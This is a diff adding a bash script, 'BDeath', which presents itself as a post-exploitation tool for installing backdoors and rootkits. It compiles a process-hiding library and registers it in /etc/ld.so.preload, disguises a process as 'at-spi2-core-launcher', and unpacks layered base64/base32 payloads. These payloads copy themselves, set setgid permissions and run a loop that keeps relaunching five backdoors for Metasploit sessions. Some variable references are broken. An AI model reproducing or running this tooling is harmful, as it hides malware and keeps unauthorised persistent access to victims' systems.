@@ -1,0 +1,253 @@
+#!/bin/bash
+
+#WARNING IN THE DEATH
+
+cyan='\033[0;31m'
+name="BDeath"
+
+#Check root
+[[ `id -u` -eq 0 ]] || { echo -e $cyan "Get root access if using!"
+exit 1
+}
+
+function banner() {
+  clear
+  echo "  BREAKTEAM - Security Team - Hack the planet "
+  echo "  $name is a tool for post exploitation, tool will setting up your backdoor/rootkits - We are death!"
+  echo ""
+}
+
+function info() {
+  banner
+  echo "  Usage: $name --h "
+  echo ""
+  echo "         $name --u [name_door] example : vnm --u backdoor "
+  echo ""
+  echo "   	 $name --i [name_door] example : vnm --i rootkit  "
+  echo ""
+  echo " --i/--inject -- this option will be hidden your process Death"
+  echo ""
+  echo " --u/--unlimited -- Unlimited your backdoor/rootkit and sessions in metasploit handler - Kill and Re-run every!"
+  echo ""
+}
+
+function inject_hidden_proc() {
+  pass=`pwd`
+  conf="temp/conf.txt"
+  echo -e " + Clean old config in temp "
+  rm $conf >> /dev/null 2>&1
+  rm temp/* >> /dev/null 2>&1
+  echo
+  sleep 2
+  echo $break > $conf
+  s0=$(cat $conf | cut -d ' ' -f1)
+  echo -e " +  Libprocess for spesific rootkit/backdoor"
+  sleep 2
+  echo
+  sed s#HIDDEN_INJECT_POINTER#$break#g $pwd/lib/procceshide.c > $pwd/temp/libprocesshide.c
+  echo -e " + Setup & Compile libprocess "
+  sleep 2
+  echo
+  gcc -Wall -fPIC -shared -o temp/libprocesshide.so lib/procceshide.c -ldl
+  echo -e " + Move libprocess to local libraries "
+  sleep 2
+  echo
+  mv temp/libprocesshide.so /usr/local/lib
+  echo -e " + Load libprocess for get hidden procces "
+  setsid sh -c "./$break" & > /dev/tty2 >&0 2>&1
+  sleep 2
+  echo ""
+  echo /usr/local/lib/libprocesshide.so >> /etc/ld.so.preload
+  sleep 1
+  echo -ne " + Inject Point for hidden process complete \n\n\n"
+}
+
+function crt_inject() {
+  for MmnMMnnUUUHbVzXaF in {$KQYDKVaFcX,$KoNtLoo,$MMmNUbz,$PkKKaXXZz,$MksXuBZaaf}
+  do
+    cp $break
+    setsid sh -c "" & > /dev/tty2 >&0 2>&1
+  done
+}
+
+function inject_point() {
+  cat << !
+  WHVYbkFLPWBlY2hvIEtRWURLVTJYSVZMR0NWQ0ZMSklGSzNEUUxCSlRDM0MyS04zVzZQSUsgfCBi
+ YXNlMzIgLWQgYDtta0l1eFhYc0I9YGVjaG8gVlcxd1ZtVldaRVpaZWtKV1lrVktUMVV5ZUZkWFJU
+ VkdaVVp3VkdReU9EbERaejA5Q2c9PSB8IGJhc2U2NCAtZCBgO01qaW5YTkE9YGVjaG8gJG1rSXV4
+ WFhzQiB8IGJhc2U2NCAtZGA7TXVYYTA9YGVjaG8gJFh1WG5BSyB8IGJhc2U2NCAtZGA7TGVYbUxr
+ SUlueEE9YGVjaG8gJE1qaW5YTkEgfCBiYXNlNjQgLWRgO01rQVNubk9OQUlTTm5PSXhueG5uTkFT
+ TkFOU29pbm54PWBlY2hvICRMZVhtTGtJSW54QXwgYmFzZTMyIC1kIGA7S1FZREtWYUZjWD1gZWNo
+ byAkTXVYYTAgfCBiYXNlMzIgLWRgO011WG9BZmE9YGVjaG8gU2pWR1JrOVdNa1JKVGtsVU1rTlJQ
+ UW89IHwgYmFzZTY0IC1kYDtNQ0FPVnh6QT1gZWNobyAkTXVYb0FmYSB8IGJhc2UzMiAtZGA7TWtz
+ WHVCWmFhZj1gZWNobyAkTUNBT1Z4ekEgfCBiYXNlMzIgLWRgO0p4SmEwQUFDPWBlY2hvIEtSQ1hB
+ UktXTk1ZSFNWQ0ZLWkdFNFZTS0taTERBVFNTS0JJVzZQSUsgfCBiYXNlMzIgLWRgO01veEFlakNB
+ QT1gZWNobyAkSnhKYTBBQUMgfCBiYXNlNjQgLWRgO0hSaU14VT1gZWNobyAkTW94QWVqQ0FBIHxi
+ YXNlMzIgLWRgO0tvTnRMb289YGVjaG8gJEhSaU14VSB8IGJhc2U2NCAtZGA7bU94eEEwb1A9YGVj
+ aG8gSlZKRUtSS1ZHSkJWVVIyS0dKRFZTV0pUSkJIRElOU1JLVTZUMlBJSyB8IGJhc2UzMiAtZGA7
+ Q2hYaXpTQWNjPWBlY2hvICRtT3h4QTBvUCB8IGJhc2UzMiAtZGA7TU1tTlViej1gZWNobyAgJENo
+ WGl6U0FjYyB8IGJhc2U2NCAtZGA7cFhvQXVuPWBlY2hvIExGNUU0VjNFR0ZZRlNVM0tKSlVGT1JK
+ Vk81TkVLWkNYTUVZRTQzU1FLUVlFV0NRPSB8IGJhc2UzMiAtZCBgO0p4VUhOYU1NPWBlY2hvICRw
+ WG9BdW4gfCBiYXNlNjQgLWQgYDtQa0tLYVhYWno9YGVjaG8gJEp4VUhOYU1NIHwgYmFzZTY0IC1k
+ YAptSXhBQWhOb1FXV3VJPWBlY2hvIFZFVldXbEl3YXpCTk1FcElVMnRXV1ZVeFdYbFdhemxQVW14
+ R1ZsQlVNRGxEWnowOUNnPT0gfCBiYXNlNjQgLWQgYCA7SmltQU5OQU5EeFg9YGVjaG8gJG1JeEFB
+ aE5vUVdXdUkgfCBiYXNlNjQgLWQgYApIck1uaVViPWBlY2hvICRKaW1BTk5BTkR4WCB8IGJhc2Uz
+ MiAtZGA7QW51R3JBaHhBbm5uYTJObT1gZWNobyAkSHJNbmlVYiB8IGJhc2U2NCAtZCBgO01tb2th
+ c0RPU0lVSERuam5vbmppTkFTSVVKREJBU2Rhc2tsej1gZWNobyAkQW51R3JBaHhBbm5uYTJObSB8
+ IGJhc2U2NCAtZCBgO3JoTUl4YT1gZWNobyBURE5XZW1OcE9YTmhWMGwyV1ZoUmRHTXpRbkJOYVRG
+ cVlqTktiRXd5UmpCTVdFNTNZVlJKZEZreU9YbGFVekZ6V1ZoV2RWa3lhR3hqWjI4OUNnPT0gfCBi
+ YXNlNjQgLWQgYDtKdW1BUG1OTklBVUJuWD1gZWNobyAkcmhNSXhhIHwgYmFzZTY0IC1kIGAKCgo=
+
+!
+}
+
+function payload_inject_ult() {
+  cat << !
+ IyEvYmluL2Jhc2gKCgoKZnVuY3Rpb24gb2JmdXNfdmFyKCkgewpsY2Rhc3Q9Ii91c3IvYmluIgpt
+ a0l1eFhYc0I9YGVjaG8gVlcxd1ZtVldaRVpaZWtKV1lrVktUMVV5ZUZkWFJUVkdaVVp3VkdReU9E
+ bERaejA5Q2c9PSB8IGJhc2U2NCAtZCBgO01qaW5YTkE9YGVjaG8gJG1rSXV4WFhzQiB8IGJhc2U2
+ NCAtZGAKTGVYbUxrSUlueEE9YGVjaG8gJE1qaW5YTkEgfCBiYXNlNjQgLWRgO01rQVNubk9OQUlT
+ Tm5PSXhueG5uTkFTTkFOU29pbm54PWBlY2hvICRMZVhtTGtJSW54QXwgYmFzZTMyIC1kIGAKWHVY
+ bkFLPWBlY2hvIEtRWURLVTJYSVZMR0NWQ0ZMSklGSzNEUUxCSlRDM0MyS04zVzZQSUsgfCBiYXNl
+ MzIgLWQgYDtZdVhWMUE9YGVjaG8gUmpVeVdFYzBVbEJPVWxWWFJVd3pUVTVHVWtoSE5ETk5UbEZH
+ UVQwOVBUMEsgfCBiYXNlNjQgLWRgO2prVEVtNDg9YGVjaG8gJFl1WFYxQSB8IGJhc2UzMiAtZGA7
+ bUV6eEFBPWBlY2hvIFRETldlbU5wT1hOaFYwbDJZa2RzYVZsdGVHaGpkMjg5Q2c9PSB8IGJhc2U2
+ NCAtZGA7YWRBbVpsSEg9YGVjaG8gJG1FenhBQSB8IGJhc2U2NCAtZGA7RGlJbUFBeHpBbW1OTk5B
+ U2N1dVVBS0hBS0hBS0hiYkE9YGVjaG8gVGxKVlYwVlpWRTFOUmxwVE5EUXpVRVpaV1ZGVlBUMDlD
+ Zz09IHwgYmFzZTY0IC1kIGA7TW5BeGFhYUU9YGVjaG8gWWtkc2FXTXpUbk5OVXpSM1RHcEJTd289
+ IHwgYmFzZTY0IC1kYDtGbFhzaEE9YGVjaG8gJE1uQXhhYWFFIHwgYmFzZTY0IC1kIGA7TW5QZVAz
+ S3g9YGVjaG8gJERpSW1BQXh6QW1tTk5OQVNjdXVVQUtIQUtIQUtIYmJBIHwgYmFzZTMyIC1kYDtN
+ dVhhMD1gZWNobyAkWHVYbkFLIHwgYmFzZTY0IC1kYDtLUVlES1ZhRmNYPWBlY2hvICRNdVhhMCB8
+ IGJhc2UzMiAtZGA7TXVYb0FmYT1gZWNobyBTalZHUms5V01rUkpUa2xVTWtOUlBRbz0gfCBiYXNl
+ NjQgLWRgO01DQU9WeHpBPWBlY2hvICRNdVhvQWZhIHwgYmFzZTMyIC1kYDtNa3NYdUJaYWFmPWBl
+ Y2hvICRNQ0FPVnh6QSB8IGJhc2UzMiAtZGA7SnhKYTBBQUM9YGVjaG8gS1JDWEFSS1dOTVlIU1ZD
+ RktaR0U0VlNLS1pMREFUU1NLQklXNlBJSyB8IGJhc2UzMiAtZGA7TW94QWVqQ0FBPWBlY2hvICRK
+ eEphMEFBQyB8IGJhc2U2NCAtZGA7SFJpTXhVPWBlY2hvICRNb3hBZWpDQUEgfGJhc2UzMiAtZGA7
+ S29OdExvbz1gZWNobyAkSFJpTXhVIHwgYmFzZTY0IC1kYDttT3h4QTBvUD1gZWNobyBKVkpFS1JL
+ VkdKQlZVUjJLR0pEVlNXSlRKQkhESU5TUktVNlQyUElLIHwgYmFzZTMyIC1kYDtDaFhpelNBY2M9
+ YGVjaG8gJG1PeHhBMG9QIHwgYmFzZTMyIC1kYDtNTW1OVWJ6PWBlY2hvICAkQ2hYaXpTQWNjIHwg
+ YmFzZTY0IC1kYDtwWG9BdW49YGVjaG8gTEY1RTRWM0VHRllGU1UzS0pKVUZPUkpWTzVORUtaQ1hN
+ RVlFNDNTUUtRWUVXQ1E9IHwgYmFzZTMyIC1kIGA7SnhVSE5hTU09YGVjaG8gJHBYb0F1biB8IGJh
+ c2U2NCAtZCBgO1BrS0thWFhaej1gZWNobyAkSnhVSE5hTU0gfCBiYXNlNjQgLWRgCm1JeEFBaE5v
+ UVdXdUk9YGVjaG8gVkVWV1dsSXdhekJOTUVwSVUydFdXVlV4V1hsV2F6bFBVbXhHVmxCVU1EbERa
+ ejA5Q2c9PSB8IGJhc2U2NCAtZCBgIDtKaW1BTk5BTkR4WD1gZWNobyAkbUl4QUFoTm9RV1d1SSB8
+ IGJhc2U2NCAtZCBgO0hyTW5pVWI9YGVjaG8gJEppbUFOTkFORHhYIHwgYmFzZTMyIC1kYDtBbnVH
+ ckFoeEFubm5hMk5tPWBlY2hvICRIck1uaVViIHwgYmFzZTY0IC1kIGA7TW1va2FzRE9TSVVIRG5q
+ bm9uamlOQVNJVUpEQkFTZGFza2x6PWBlY2hvICRBbnVHckFoeEFubm5hMk5tIHwgYmFzZTY0IC1k
+ IGAKfQoKZnVuY3Rpb24gc2VsZl9jb3B5ICgpewpta2RpciAtcCAkamtURW00ODtta2RpciAtcCAk
+ YWRBbVpsSEg7Y3AgJDAgJGprVEVtNDgvJEZsWHNoQTtjcCAkMCAkYWRBbVpsSEgvJE1uUGVQM0t4
+ O2NobW9kIDI3NTUgJGprVEVtNDgvJEZsWHNoQTtjaG1vZCAyNzc1ICRhZEFtWmxISC8kTW5QZVAz
+ S3gKfQoKZnVuY3Rpb24gZG9vcjFfY2hlY2sgKCkgewpQSURTPWAkTW1va2FzRE9TSVVIRG5qbm9u
+ amlOQVNJVUpEQkFTZGFza2x6ICRLUVlES1ZhRmNYYAppZiBbIC16ICIkUElEUyIgXTsgdGhlbgog
+ ICAgICAgIHNldHNpZCBzaCAtYyAiJEtRWURLVmFGY1giICYgPiAvZGV2L3R0eTIgPiYwIDI+JjEK
+ ZWxzZQogICBmb3IgUElEIGluICRQSURTOyBkbwogICAgZWNobyAiIgogIGRvbmUKZmkKfQoKCmZ1
+ bmN0aW9uIGRvb3IyX2NoZWNrICgpIHsKUElEUz1gJE1tb2thc0RPU0lVSERuam5vbmppTkFTSVVK
+ REJBU2Rhc2tseiAkS29OdExvb2AKaWYgWyAteiAiJFBJRFMiIF07IHRoZW4KICAgICAgICBzZXRz
+ aWQgc2ggLWMgIiRLb050TG9vIiAmID4gL2Rldi90dHkyID4mMCAyPiYxCmVsc2UKICAgZm9yIFBJ
+ RCBpbiAkUElEUzsgZG8KICAgZWNobyAiIgogIGRvbmUKZmkKfQoKCmZ1bmN0aW9uIGRvb3IzX2No
+ ZWNrICgpIHsKUElEUz1gJE1tb2thc0RPU0lVSERuam5vbmppTkFTSVVKREJBU2Rhc2tseiAkUGtL
+ S2FYWFp6YAppZiBbIC16ICIkUElEUyIgXTsgdGhlbgogICAgICAgIHNldHNpZCBzaCAtYyAiJFBr
+ S0thWFhaeiIgJiA+IC9kZXYvdHR5MiA+JjAgMj4mMQplbHNlCiAgIGZvciBQSUQgaW4gJFBJRFM7
+ IGRvCiAgIGVjaG8gIiIKICBkb25lCmZpCn0KCgpmdW5jdGlvbiBkb29yNF9jaGVjayAoKSB7ClBJ
+ RFM9YCRNbW9rYXNET1NJVUhEbmpub25qaU5BU0lVSkRCQVNkYXNrbHogJE1rc1h1QlphYWZgCmlm
+ IFsgLXogIiRQSURTIiBdOyB0aGVuCiAgICAgICAgc2V0c2lkIHNoIC1jICIkTWtzWHVCWmFhZiIg
+ JiA+IC9kZXYvdHR5MiA+JjAgMj4mMQplbHNlCiAgIGZvciBQSUQgaW4gJFBJRFM7IGRvCiAgIGVj
+ aG8gIiIKICBkb25lCmZpCn0KCgpmdW5jdGlvbiBkb29yNV9jaGVjayAoKSB7ClBJRFM9YCRNbW9r
+ YXNET1NJVUhEbmpub25qaU5BU0lVSkRCQVNkYXNrbHogJE1NbU5VYnpgCmlmIFsgLXogIiRQSURT
+ IiBdOyB0aGVuCiAgICAgICBzZXRzaWQgc2ggLWMgIiRNTW1OVWJ6IiAmID4gL2Rldi90dHkyID4m
+ MCAyPiYxCmVsc2UKICAgZm9yIFBJRCBpbiAkUElEUzsgZG8KICAgZWNobyAiIgogIGRvbmUKZmkK
+ fQoKZnVuY3Rpb24gaW5qZWN0X3BvaW50X3RvX2NoZWNrICgpIHsKd2hpbGUgdHJ1ZQpkbwoJb2Jm
+ dXNfdmFyO2Rvb3IxX2NoZWNrO3NsZWVwIDI7ZG9vcjJfY2hlY2s7c2xlZXAgMSA7ZG9vcjNfY2hl
+ Y2s7c2xlZXAgMTtkb29yNF9jaGVjaztzbGVlcCAzO2Rvb3I1X2NoZWNrO3NsZWVwIDEKZG9uZQp9
+ CgoKaW5qZWN0X3BvaW50X3RvX2NoZWNrCg==
+
+!
+}
+
+case $1 in
+	--u|--unlimited)
+  	break=$2
+	if [ -f "$break" ]
+	  then
+clear
+conf="temp/conf.txt"
+pwd=`pwd`
+banner
+echo -ne " Create Inject Point [ Unlimited ]   \n\n"
+echo -e  " + Clean  old config in temp "
+sleep 1
+echo
+rm temp/FuckTheShit > /dev/null 2>&1
+rm $conf >> /dev/null 2>&1
+rm temp/*.c >> /dev/null 2>&1
+inject_point | base64 -d > temp/FuckTheShit
+source temp/FuckTheShit
+echo -e  "+ Execute Child Process with infinity sessions ( Warning: unstopable ) "
+sleep 1
+echo
+crt_inject
+touch $conf
+echo -e  " + Create & Make The Parent Process Invisible "
+sleep 1
+echo
+mCoreHidDeNAKSDA="at-spi2-core-launcher"
+s0=$(cat $conf | cut -d ' ' -f1)
+echo -e  " + Settings libprocess for rootkit/backdoor"
+sleep 1
+echo
+sed s#HIDDEN_INJECT_POINTER#$mCoreHidDeNAKSDA#g $pwd/lib/processhide.c > $pwd/temp/libprocesshide.c
+echo -e  " + Setup and Compile libprocess  "
+sleep 1
+echo
+gcc -Wall -fPIC -shared -o $pwd/temp/libprocesshide.so $pwd/lib/processhide.c -ldl
+echo -e  " + Move libprocess to local libraries  "
+sleep 1
+echo
+mv temp/libprocesshide.so /usr/local/lib/
+echo -e  " + Load libprocess for get hidden process  "
+sleep 1
+echo
+echo /usr/local/lib/libprocesshide.so >> /etc/ld.so.preload
+echo -e  " + Execute The Parent Process  "
+sleep 1
+echo
+payload_inject_ult | base64 -d > $JumAPmNNIAUBnX
+chmod 2755 $JumAPmNNIAUBnX
+setsid sh -c "$JumAPmNNIAUBnX" & > /dev/tty2 >&0 2>&1
+	echo -ne  " + Create Inject Point Success!"
+  echo -e "Press any key to exit \n\n"
+	read inject1
+	rm temp/* >> /dev/null 2>&1
+  	exit 1
+ 	 elif [ ! -f "$break"  ]
+			then
+		banner
+		echo -e " + File not found\n\n"
+fi
+;;
+
+--i|--inject)
+break=$2
+	if [ -f "$break" ]
+	  then
+    banner
+    echo -ne " + Create Inject Point for hidden process \n\n"
+	inject_hidden_proc
+	echo -ne  " + Create Inject Point Success!"
+  echo -e "Press any key to exit \n\n"
+	rm temp/* >> /dev/null 2>&1
+	read inject1
+  exit 1
+  elif [ ! -f "$break"  ]
+	 then
+	banner
+	echo -e " + File not Found\n\n"
+fi
+;;
+
+*)
+	echo
+	clear
+	info
+;;
+esac
